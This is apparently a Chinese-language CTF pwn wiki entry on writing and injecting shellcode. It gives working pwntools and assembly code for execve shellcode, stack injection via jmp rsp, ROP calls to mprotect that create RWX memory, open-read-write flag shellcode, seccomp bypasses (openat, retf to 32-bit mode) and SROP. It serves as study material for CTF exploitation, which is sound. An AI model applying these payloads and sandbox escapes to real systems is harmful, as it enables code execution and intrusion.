---
category: pwn
tags: [shellcode, mprotect, mmap, nx_bypass, seccomp, orw, open_read_write, shellcraft, alphanumeric, 可执行内存, 沙箱逃逸, 读写flag]
triggers: [shellcode, rwx, mprotect, mmap, NX bypass, jmp rsp, seccomp, sandbox, open read write, ORW, shellcraft, 写shellcode, 可执行栈, alphanumeric shellcode]
related: [rop_chain, ret2libc, stack_pivot, canary_bypass]
---

# Shellcode 编写与注入

## 什么时候用

有代码注入的机会（可控缓冲区）且存在可执行的内存区域。常见场景：
- NX 关闭（栈可执行）——直接在栈上写 shellcode
- 有 `mprotect`/`mmap` 可调——先用 ROP 创建 RWX 页，再跳转
- 题目主动提供 RWX 区域（如 `mmap(PROT_READ|PROT_WRITE|PROT_EXEC)`）
- seccomp 禁止 `execve`——需要手写 ORW（open-read-write）shellcode

## 前提条件

- **有可写+可执行的内存**：NX 关闭，或能通过 ROP 调 `mprotect`/`mmap`
- **知道 shellcode 的运行地址**：栈泄露、堆泄露或固定地址
- **没有严格的输入过滤**：或者能用编码绕过（alphanumeric 等）
- **了解 seccomp 规则**：如有沙箱，需要 `seccomp-tools dump ./vuln` 检查

## 攻击步骤

### 1. 基础 shellcode（execve("/bin/sh")）

用 pwntools 的 shellcraft 快速生成：

```python
from pwn import *

context.arch = 'amd64'

# 方法一：shellcraft 自动生成
shellcode = asm(shellcraft.sh())
print(f"Length: {len(shellcode)} bytes")

# 方法二：手写精简版（23 bytes）
shellcode = asm('''
    xor rsi, rsi          /* rsi = 0 (argv = NULL) */
    push rsi              /* 压入 NULL 终止符 */
    mov rdi, 0x68732f6e69622f  /* "/bin/sh" */
    push rdi
    mov rdi, rsp          /* rdi = &"/bin/sh" */
    xor edx, edx          /* rdx = 0 (envp = NULL) */
    push 59
    pop rax               /* rax = 59 (execve) */
    syscall
''')
```

### 2. NX 关闭时直接注入

栈可执行时，溢出覆盖返回地址跳到栈上的 shellcode：

```python
from pwn import *

context.binary = elf = ELF('./vuln')
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
OFFSET = 72

# 方式一：已知栈地址
stack_addr = 0x7fffffffe000  # 从泄露获得

payload = shellcode.ljust(OFFSET, b'\x90')
payload += p64(stack_addr)  # 返回到 shellcode

# 方式二：用 jmp rsp gadget（不需要知道精确栈地址）
JMP_RSP = 0x401234  # jmp rsp gadget

payload = b'A' * OFFSET
payload += p64(JMP_RSP)
payload += shellcode  # ret 后 RSP 指向这里，jmp rsp 执行 shellcode

p = process()
p.sendline(payload)
p.interactive()
```

### 3. 用 mprotect 开启可执行权限

NX 开启时，先 ROP 调 `mprotect` 把 BSS/栈变成 RWX，再跳过去：

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# 假设已泄露 libc
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
# rdx 控制可能需要 ret2csu 或 libc gadget

BSS_PAGE = elf.bss() & ~0xfff  # 页对齐

# ROP: mprotect(bss_page, 0x1000, 7) + read(0, bss, len) + jmp bss
payload = b'A' * OFFSET
payload += p64(POP_RDI) + p64(BSS_PAGE)
payload += p64(POP_RSI) + p64(0x1000)
# 设置 rdx = 7 (PROT_READ|PROT_WRITE|PROT_EXEC)
payload += p64(POP_RDX_RBX) + p64(7) + p64(0)
payload += p64(libc.sym['mprotect'])
# 然后 read shellcode 到 BSS
payload += p64(POP_RDI) + p64(0)
payload += p64(POP_RSI) + p64(elf.bss(0x100))
payload += p64(POP_RDX_RBX) + p64(0x200) + p64(0)
payload += p64(libc.sym['read'])
# 跳到 shellcode
payload += p64(elf.bss(0x100))

p.sendline(payload)
# 发送 shellcode
p.send(asm(shellcraft.sh()))
p.interactive()
```

### 4. ORW Shellcode（seccomp 禁止 execve）

seccomp 只允许 open/read/write 时，手写读 flag 的 shellcode：

```python
from pwn import *

context.arch = 'amd64'

# 检查 seccomp 规则
# $ seccomp-tools dump ./vuln

# ORW shellcode: open("flag.txt") -> read(fd, buf, size) -> write(1, buf, size)
shellcode = asm('''
    /* open("flag.txt", O_RDONLY) */
    mov rax, 0x7478742e67616c66   /* "flag.txt" 小端 */
    push 0
    push rax
    mov rdi, rsp          /* rdi = &"flag.txt" */
    xor esi, esi          /* rsi = O_RDONLY = 0 */
    xor edx, edx          /* rdx = 0 */
    mov eax, 2            /* syscall: open */
    syscall

    /* read(fd, rsp, 0x100) */
    mov edi, eax          /* rdi = fd */
    mov rsi, rsp          /* rsi = buffer (栈上) */
    mov edx, 0x100        /* rdx = count */
    xor eax, eax          /* syscall: read = 0 */
    syscall

    /* write(1, rsp, rax) */
    mov edx, eax          /* rdx = bytes_read */
    mov rsi, rsp          /* rsi = buffer */
    mov edi, 1            /* rdi = stdout */
    mov eax, 1            /* syscall: write */
    syscall
''')

print(f"ORW shellcode: {len(shellcode)} bytes")
```

用 shellcraft 更简洁：

```python
shellcode = asm(
    shellcraft.open('flag.txt') +
    shellcraft.read('rax', 'rsp', 0x100) +
    shellcraft.write(1, 'rsp', 0x100)
)
```

### 5. seccomp 绕过技巧

当 `open` 也被禁止时：

```python
# openat(AT_FDCWD, "flag.txt", O_RDONLY)
# syscall 号 257，经常被 seccomp 遗漏
shellcode = asm('''
    mov rdi, -100           /* AT_FDCWD */
    lea rsi, [rip + flag]
    xor edx, edx
    mov eax, 257            /* openat */
    syscall
    /* ... read + write ... */
flag: .string "flag.txt"
''')

# 或用 openat2（syscall 437），更新的系统调用更容易被遗漏
# 或用 sendfile(stdout, fd, NULL, size) 替代 read+write
```

### 6. Alphanumeric Shellcode

某些题目只允许可打印字符（0x20-0x7e）。用 alpha3 编码器或 pwntools 的 encoder：

```python
from pwn import *

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

# 使用 pwntools 编码器
encoded = encode(shellcode, avoid=b'\x00\x0a\x0d')

# 或使用 alpha3 工具
# python alpha3/alpha3.py x64 ascii mixedcase rax < shellcode.bin
```

## 常见坑

- **\x00 截断**：`gets`/`strcpy` 遇到空字节停止。避免 shellcode 中出现 `\x00`——用 `xor reg, reg` 代替 `mov reg, 0`，用 `push imm8; pop reg` 代替 `mov reg, imm`。
- **栈地址不固定**：ASLR 开启时栈地址随机。用 `jmp rsp` / `call rsp` gadget 避免硬编码地址，或泄露栈地址。
- **seccomp-tools 是必须的**：不要猜测沙箱规则，用 `seccomp-tools dump ./vuln` 精确查看允许的 syscall。
- **mprotect 需要页对齐**：地址参数必须页对齐（`addr & ~0xfff`），size 建议至少 `0x1000`。
- **x86 和 x86-64 syscall 号不同**：`open` 在 64 位是 2，在 32 位是 5。`execve` 在 64 位是 59，在 32 位是 11。搞混会导致调错 syscall。
- **shellcode 自修改**：如果 shellcode 需要运行时修改自身（如解码），确保内存同时有 W 和 X 权限。

## 变体

### RETF 架构切换（绕过 64 位 seccomp）

`retf` 指令切换到 32 位模式（CS=0x23），32 位的 `int 0x80` 使用不同的 syscall 号，seccomp 通常不检查 32 位调用：

```python
# 先 mprotect BSS 为 RWX，然后 retf 跳到 32 位 shellcode
rop += p64(RETF_GADGET)
rop += p32(shellcode_addr)  # 32-bit EIP
rop += p32(0x23)             # CS = 0x23 (compat mode)
```

### SROP 构造 RWX

只有 `syscall; ret` 和控制 rax 的能力时，用 SROP 调 `mprotect`：

```python
frame = SigreturnFrame()
frame.rax = 10              # mprotect
frame.rdi = page_addr
frame.rsi = 0x1000
frame.rdx = 7               # RWX
frame.rip = syscall_ret
frame.rsp = next_rop_addr   # mprotect 返回后继续 ROP
```

### 极短 shellcode

空间极度受限时（< 20 字节），用 `read` syscall 做 stage2：先写一个只做 `read(0, rsp, big)` 的超短 shellcode（~12 字节），再发送完整 shellcode。

## 相关技术

- [[rop_chain]] — 用 ROP 调 mprotect/mmap 创建可执行内存
- [[stack_pivot]] — 迁移到已布置 shellcode 的区域
- [[ret2libc]] — 不需要 shellcode 的替代方案
- [[canary_bypass]] — 有 canary 时需要先绕过才能到达返回地址
